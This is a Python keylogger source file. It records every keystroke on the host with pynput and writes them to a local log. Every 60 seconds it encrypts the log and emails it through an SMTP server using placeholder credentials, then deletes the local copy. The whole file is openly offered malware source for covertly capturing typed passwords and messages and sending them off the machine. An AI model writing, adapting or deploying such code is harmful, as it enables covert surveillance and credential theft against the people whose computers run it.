import os
import sys
import time
import smtplib
from threading import Thread
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

# Keylogger configuration
log_file = "keylog.txt"
key = b'your_encryption_key_here'  # Replace with your encryption key generated using Fernet.generate_key()

# Function to encrypt data
def encrypt(message):
    cipher_suite = Fernet(key)
    encrypted_message = cipher_suite.encrypt(message.encode())
    return encrypted_message

# Function to send logs via email
def send_logs():
    try:
        server = smtplib.SMTP('smtp.example.com', 587)  # Replace with your SMTP server and port
        server.starttls()
        server.login('your_email@example.com', 'your_password')  # Replace with your email credentials

        with open(log_file, "rb") as f:
            encrypted_logs = encrypt(f.read().decode())

        server.sendmail('from_email@example.com', 'to_email@example.com', encrypted_logs)
        server.quit()
        os.remove(log_file)  # Remove log file after sending
    except Exception as e:
        print(f"Failed to send email: {str(e)}")

# Function to log keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            elif key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.backspace:
                f.write('[BACKSPACE]')
            else:
                f.write(f'[{str(key)}]')
    except Exception as e:
        print(f"Error logging key: {str(e)}")

# Setting up the listener
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Optional: Run keylogger in a separate thread
keylogger_thread = Thread(target=start_keylogger)
keylogger_thread.daemon = True  # Ensures the thread is terminated when the main program exits
keylogger_thread.start()

# Optional: Send logs periodically (e.g., every 60 seconds)
while True:
    send_logs()
    time.sleep(60)  # Adjust interval as needed
